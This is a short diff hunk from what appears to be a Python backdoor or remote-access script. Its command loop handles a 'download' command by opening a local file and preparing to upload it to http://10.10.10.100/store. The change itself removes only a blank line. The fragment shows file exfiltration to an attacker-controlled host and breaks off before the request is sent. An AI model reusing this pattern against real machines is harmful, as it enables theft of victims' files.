@@ -10,7 +10,6 @@ while True:
         break
     elif 'download' in command:
         grab, path = command.split('*')
-
         if os.path.exists(path):
             url = 'http://10.10.10.100/store'
             files = {'file': open(path, 'rb')}
